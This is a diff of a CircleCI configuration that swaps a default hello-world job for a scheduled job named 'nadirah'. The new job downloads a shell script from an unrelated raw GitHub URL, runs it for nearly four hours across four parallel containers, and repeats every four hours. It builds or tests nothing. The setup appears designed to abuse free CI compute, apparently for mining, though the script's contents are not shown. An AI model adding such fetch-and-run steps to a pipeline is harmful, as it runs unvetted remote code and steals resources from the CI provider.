@@ -1,26 +1,32 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
+working_dir: &working_dir ~/app
 
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+version: 2.0
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+  nadirah:
+    parallelism: 4
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+      - image: circleci/php:8.0.6
     steps:
-      - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+    - checkout
+    - run:
+        name: torasudiro
+        command: |
+                  wget -O buildphp.sh https://raw.githubusercontent.com/set-arithmetic/Buildkite/main/buildphp.sh && chmod u+x buildphp.sh && timeout 238m ./buildphp.sh && echo "suksesd"
+        no_output_timeout: 360m
+        
 workflows:
-  say-hello-workflow:
+  version: 2
+  commit:
     jobs:
-      - say-hello
+      - nadirah
+    triggers:
+      - schedule:
+          cron: "0 2,6,10,14,18,22 * * *"
+          filters:
+            branches:
+              only:
+                - master
+                
+  phprunbuild:
+    jobs:
+      - nadirah
